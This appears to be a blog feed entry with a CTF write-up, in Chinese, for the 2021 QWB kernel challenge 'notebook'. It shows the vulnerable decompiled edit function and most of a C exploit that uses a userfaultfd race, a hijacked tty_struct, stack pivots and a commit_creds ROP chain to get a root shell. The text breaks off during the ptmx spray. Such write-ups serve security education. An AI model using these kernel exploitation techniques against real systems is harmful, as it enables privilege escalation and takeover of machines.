    <updated>2022-09-30T01:52:30.123Z</updated>
    
    <content type="html"><![CDATA[<h1 id="notebook的多种解法"><a class="markdownIt-Anchor" href="#notebook的多种解法">#</a> notebook 的多种解法</h1><p>2021 QWB</p><p>这个题就是考锁没加好的多线程条件竞争</p><h2 id="传统rop-ptmx"><a class="markdownIt-Anchor" href="#传统rop-ptmx">#</a> 传统 ROP -ptmx</h2><p>利用 realloc 指针延迟回写的效果 将 free 的块回写回控制区</p><p>造成对 tty struct 结构体的控制</p><p>然后泄漏 kernel base</p><p>并两段栈迁移 (测试过 一段迁移不行 会卡在一个地方)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> newsize, <span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r13</span></span><br><span class="line">  note *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// r12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  (···)</span><br><span class="line">  </span><br><span class="line">  v4 = v3;</span><br><span class="line">  v5 = &amp;notebook[idx];</span><br><span class="line">  raw_read_lock(&amp;lock);                      [<span class="number">1</span>] &lt;&lt;- 加了读锁</span><br><span class="line">  size = v5-&gt;size;<span class="comment">// size是原size</span></span><br><span class="line">  v5-&gt;size = newsize;<span class="comment">// 立刻改成了我们输入的新size</span></span><br><span class="line">  <span class="keyword">if</span> ( size == newsize )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> editout;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 这里会把notefree 却没立刻置空</span></span><br><span class="line">  v7 = (*(__int64 (__fastcall **)(<span class="type">void</span> *, <span class="type">size_t</span>, __int64))krealloc.gap0)(v5-&gt;note, newsize, <span class="number">37748928LL</span>);</span><br><span class="line">  copy_from_user(name, v4, <span class="number">256LL</span>);           [<span class="number">2</span>] &lt;&lt;- 这里可以uffd</span><br><span class="line">  <span class="title function_">if</span> <span class="params">( !v5-&gt;size )</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;free in fact&quot;</span>);</span><br><span class="line">    v5-&gt;note = <span class="number">0LL</span>;</span><br><span class="line">    v8 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> editout;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)_virt_addr_valid(v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    v5-&gt;note = (<span class="type">void</span> *)v7;                   [<span class="number">3</span>] &lt;&lt;- 这里写回note</span><br><span class="line">    v8 = <span class="number">2LL</span>;</span><br><span class="line">editout:</span><br><span class="line">    raw_read_unlock(&amp;lock);</span><br><span class="line">    printk(<span class="string">&quot;[o] Edit success. %s edit a note.\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(<span class="string">&quot;[x] Return ptr unvalid.\n&quot;</span>);</span><br><span class="line">  raw_read_unlock(&amp;lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/09/11/kernel-notebook-three-solutions/1.png" alt="Pasted image 20220910152111"></p><p>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/head.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 1024</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uffd_register</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">UFFD_handler</span><span class="params">(<span class="type">void</span> *nil)</span>;</span><br><span class="line"><span class="type">int</span> uffd, note_fd;</span><br><span class="line"><span class="type">uint64_t</span> mod_base_addr, cookie ,kernel_base_addr;</span><br><span class="line"><span class="type">uint64_t</span> fault_page, fault_page_len;</span><br><span class="line"><span class="type">uint64_t</span> target, modprobe_path;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> errExit(msg) &#123; \</span></span><br><span class="line"><span class="meta">perror(msg);       \</span></span><br><span class="line"><span class="meta">exit(1);   \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">uint64_t</span> idx;</span><br><span class="line"><span class="type">uint64_t</span> size;</span><br><span class="line"><span class="type">uint64_t</span> buf;</span><br><span class="line">&#125;userarg;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ELEM 0x100</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span> </span><br><span class="line">SWAPGS_POP_RET, IRETQ, COMMIT_CREDS,</span><br><span class="line">PREPARE_KERNEL_CRED, </span><br><span class="line">SUB_RSP_RET ,PUSH_RDI_POP_RSP_POP_RET,</span><br><span class="line">POP_RDI ,POP_RSP,</span><br><span class="line">MOV_RDI_RAX_POP_RET,</span><br><span class="line">TERMINATOR</span><br><span class="line">&#125;;<span class="comment">//PREPARE_KERNEL_CRED, COMMIT_CREDS, &#125;;</span></span><br><span class="line">u64 a[MAX_ELEM];</span><br><span class="line"><span class="comment">//tty_struct结构体的大小</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"><span class="comment">//如果我们申请0x2E0的空间，slab分配的堆实际大小为0x400 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REAL_HEAP_SIZE 0x400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RAW_KERNEL_BASE 0xffffffff81000000</span></span><br><span class="line"><span class="type">int</span> protect1[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">int</span> ptmx_fds[<span class="number">0x100</span>];<span class="comment">// 测了我很久才发现这个b被不知道谁溢出了 加两个保护挡一下</span></span><br><span class="line"><span class="type">int</span> protect2[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">a[SWAPGS_POP_RET] = <span class="number">0xffffffff810637d4</span>;</span><br><span class="line">a[IRETQ] = <span class="number">0xffffffff810338bb</span>;</span><br><span class="line">a[COMMIT_CREDS] = <span class="number">0xffffffff810a9b40</span>;</span><br><span class="line">a[PREPARE_KERNEL_CRED]= <span class="number">0xffffffff810a9ef0</span>;</span><br><span class="line">a[SUB_RSP_RET] = <span class="number">0xffffffff8100354f</span>;</span><br><span class="line">a[PUSH_RDI_POP_RSP_POP_RET] = <span class="number">0xffffffff8143f4e1</span>;</span><br><span class="line">a[POP_RDI]    = <span class="number">0xffffffff81007115</span>;</span><br><span class="line">a[POP_RSP] = <span class="number">0xffffffff810bc110</span>;</span><br><span class="line">a[MOV_RDI_RAX_POP_RET]= <span class="number">0xffffffff81045833</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">addKernelBase</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TERMINATOR ;i++)&#123;</span><br><span class="line">a[i] += kernel_base_addr - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getshell</span><span class="params">()</span>&#123;</span><br><span class="line">Info(<span class="string">&quot;UID is %d&quot;</span>, getuid());</span><br><span class="line"><span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">Done(<span class="string">&quot;Get shell&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Panic(<span class="string">&quot;Get shell failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">u64 user_cs, user_ss, user_sp, user_flags;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveState</span><span class="params">()</span>&#123;</span><br><span class="line">__asm__ (</span><br><span class="line"><span class="string">&quot;mov %cs, user_cs;&quot;</span></span><br><span class="line"><span class="string">&quot;mov %ss, user_ss;&quot;</span></span><br><span class="line"><span class="string">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class="line"><span class="string">&quot;pushf;&quot;</span></span><br><span class="line"><span class="string">&quot;pop user_flags;&quot;</span></span><br><span class="line">);</span><br><span class="line">Done(<span class="string">&quot;saveState&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">void</span> *(*pkc)(<span class="type">int</span>) = (<span class="type">void</span> *(*)(<span class="type">int</span>))(a[PREPARE_KERNEL_CRED]);</span><br><span class="line"><span class="type">void</span> (*cc)(<span class="type">void</span> *) = (<span class="type">void</span> (*)(<span class="type">void</span> *))(a[COMMIT_CREDS]);</span><br><span class="line">(*cc)((*pkc)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">userarg arg;</span><br><span class="line">arg.idx = (<span class="type">uint64_t</span>)idx;</span><br><span class="line">arg.size = (<span class="type">uint64_t</span>)size;</span><br><span class="line">arg.buf = (<span class="type">uint64_t</span>)buf;</span><br><span class="line">ioctl(note_fd, <span class="number">0x100</span> ,&amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">userarg arg;</span><br><span class="line">arg.idx = (<span class="type">uint64_t</span>)idx;</span><br><span class="line">ioctl(note_fd, <span class="number">0x200</span> ,&amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> newsize, <span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">userarg arg;</span><br><span class="line">arg.idx = (<span class="type">uint64_t</span>)idx;</span><br><span class="line">arg.size = (<span class="type">uint64_t</span>)newsize;</span><br><span class="line">arg.buf = (<span class="type">uint64_t</span>)buf;</span><br><span class="line">ioctl(note_fd, <span class="number">0x300</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">(<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">userarg arg;</span><br><span class="line">arg.buf = (<span class="type">uint64_t</span>)buf;</span><br><span class="line">ioctl(note_fd, <span class="number">100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_to_kernel</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">char</span> *user_buf)</span>&#123;</span><br><span class="line">write(note_fd, user_buf, idx);<span class="comment">// 逆向 mynote_read可以得到</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_from_kernel</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">char</span> *user_buf)</span>&#123;</span><br><span class="line">read(note_fd, user_buf, idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *buf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">void</span> *buf;</span><br><span class="line">u64 size;</span><br><span class="line">&#125;notebook;</span><br><span class="line"></span><br><span class="line">notebook ntbk[<span class="number">10</span>];</span><br><span class="line"><span class="type">uint64_t</span> heap[<span class="number">2</span>];</span><br><span class="line"><span class="type">uint64_t</span> notebook_addr;</span><br><span class="line">u64 fake_tty_struct[<span class="number">128</span>];</span><br><span class="line">u64 fake_tty_ops[<span class="number">128</span>];</span><br><span class="line"><span class="type">char</span> zero[PAGE_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">init();</span><br><span class="line">saveState();</span><br><span class="line"></span><br><span class="line">note_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">Info(<span class="string">&quot;note_fd is %d&quot;</span>,note_fd);</span><br><span class="line"><span class="keyword">if</span>(note_fd &lt; <span class="number">0</span>) errExit(<span class="string">&quot;open&quot;</span>);</span><br><span class="line"></span><br><span class="line">buf = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x100</span>);<span class="comment">// name的长度</span></span><br><span class="line"></span><br><span class="line">FILE * stream = popen(<span class="string">&quot;cat /tmp/moduleaddr | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">assert(stream != <span class="literal">NULL</span>);</span><br><span class="line">fread(buf, <span class="number">0x10</span> + <span class="number">2</span>, <span class="number">1</span> ,stream);</span><br><span class="line">mod_base_addr = strtoul(buf, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">Info(<span class="string">&quot;moduleaddr is %lx&quot;</span>, mod_base_addr);</span><br><span class="line"></span><br><span class="line">fault_page = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, </span><br><span class="line">MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">fault_page_len = <span class="number">0x1000</span>;</span><br><span class="line">uffd_register();</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span> ,<span class="number">0x60</span> ,zero);</span><br><span class="line">edit(<span class="number">0</span> ,<span class="number">0x3ff</span> ,zero);<span class="comment">// 重新申请一个0x400的块</span></span><br><span class="line">edit(<span class="number">0</span> ,<span class="number">0x400</span> ,fault_page);<span class="comment">// 返回上一个原块的地址 写完size就卡住</span></span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; i++)&#123;</span><br><span class="line">Info(<span class="string">&quot;ptmx_fds[%d] is %d&quot;</span>, i, ptmx_fds[i]);</span><br><span class="line">ptmx_fds[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">read_from_kernel(<span class="number">0</span>, fake_tty_struct);</span><br><span class="line">Info(<span class="string">&quot;fake_tty_struct&#x27;s addr is 0x%lx&quot;</span>, fake_tty_struct);</span><br><span class="line"><span class="comment">// 此时gdb看内存 可以看到相关泄漏的地址</span></span><br><span class="line">kernel_base_addr = fake_tty_struct[<span class="number">3</span>] - <span class="number">0xe8e440</span>;</span><br><span class="line">Info(<span class="string">&quot;kernel base addr is 0x%lx&quot;</span>, kernel_base_addr);</span><br><span class="line">addKernelBase();</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, zero);</span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x100</span>, zero);<span class="comment">// ROP</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>, zero);<span class="comment">// tty ops </span></span><br><span class="line"></span><br><span class="line">gift(ntbk);</span><br><span class="line">u64 tty_ops_addr = ntbk[<span class="number">2</span>].buf;</span><br><span class="line">u64 rop_addr = ntbk[<span class="number">1</span>].buf;</span><br><span class="line">Info(<span class="string">&quot;rop&#x27;s addr is 0x%lx&quot;</span>, rop_addr);</span><br><span class="line">Info(<span class="string">&quot;tty_ops_addr&#x27;s addr is 0x%lx&quot;</span>, tty_ops_addr);</span><br><span class="line"></span><br><span class="line">fake_tty_struct[<span class="number">3</span>] = tty_ops_addr;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0xffffffff8100354f                  sub    rsp, 0xffffffffffffff80</span></span><br><span class="line"><span class="comment">0xffffffff81003553                  pop    rbx</span></span><br><span class="line"><span class="comment">0xffffffff81003554                  pop    rbp</span></span><br><span class="line"><span class="comment">0xffffffff81003555                  ret </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">fake_tty_struct[<span class="number">1</span>] = a[SUB_RSP_RET];<span class="comment">// rsp + 0x80 + pop * 2 = 18 * 8</span></span><br><span class="line">fake_tty_struct[<span class="number">0x14</span>]= a[POP_RSP];<span class="comment">// 1 + 18 + 1 = 0x14</span></span><br><span class="line">fake_tty_struct[<span class="number">0x15</span>]= rop_addr;<span class="comment">// 第二次栈迁移</span></span><br><span class="line">Info(<span class="string">&quot;write_to_kernel(0, fake_tty_struct);&quot;</span>);</span><br><span class="line">write_to_kernel(<span class="number">0</span>, fake_tty_struct);</span><br><span class="line"></span><br><span class="line"><span class="comment">// write operation , rdi is tty_struct&#x27;s addr</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0xffffffff8143f4e1                  push   rdi</span></span><br><span class="line"><span class="comment">0xffffffff8143f4e2                  pop    rsp</span></span><br><span class="line"><span class="comment">0xffffffff8143f4e3                  pop    rbp</span></span><br><span class="line"><span class="comment">0xffffffff8143f4e4                  or     eax, edx</span></span><br><span class="line"><span class="comment">0xffffffff8143f4e6                  ret </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">fake_tty_ops[<span class="number">7</span>] = a[PUSH_RDI_POP_RSP_POP_RET];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">u64 ROP[<span class="number">0x20</span>];<span class="comment">// 这个ROP是要写入内核的 不需要去打CR4关smep</span></span><br><span class="line">ROP[i++] = a[POP_RDI];</span><br><span class="line">ROP[i++] = <span class="number">0</span>;</span><br><span class="line">ROP[i++] = a[PREPARE_KERNEL_CRED];<span class="comment">// rax = prepare_kernel_cred(0)</span></span><br><span class="line">ROP[i++] = a[MOV_RDI_RAX_POP_RET];<span class="comment">// rdi = rax</span></span><br><span class="line">ROP[i++] = <span class="number">0</span>;</span><br><span class="line">ROP[i++] = a[COMMIT_CREDS];<span class="comment">// commit_creds(rdi) get root</span></span><br><span class="line">ROP[i++] = a[SWAPGS_POP_RET];</span><br><span class="line">ROP[i++] = <span class="number">0</span>;</span><br><span class="line">ROP[i++] = a[IRETQ];</span><br><span class="line">ROP[i++] = (u64)getshell;</span><br><span class="line">ROP[i++] = user_cs;</span><br><span class="line">ROP[i++] = user_flags;</span><br><span class="line">ROP[i++] = user_sp;</span><br><span class="line">ROP[i++] = user_ss;</span><br><span class="line">Info(<span class="string">&quot;write_to_kernel(1, ROP)&quot;</span>);</span><br><span class="line">write_to_kernel(<span class="number">1</span>, ROP);</span><br><span class="line">Info(<span class="string">&quot;write_to_kernel(2, fake_tty_ops)&quot;</span>);</span><br><span class="line">write_to_kernel(<span class="number">2</span>, fake_tty_ops);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> tmp[] = <span class="string">&quot;squsqusqusqu&quot;</span>;</span><br><span class="line"></span><br><span class="line">Info(<span class="string">&quot;Spray write ptmx start&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; i++)&#123;</span><br><span class="line"><span class="comment">// Dbg(&quot;fd is [%d]&quot;, ptmx_fds[i]);</span></span><br><span 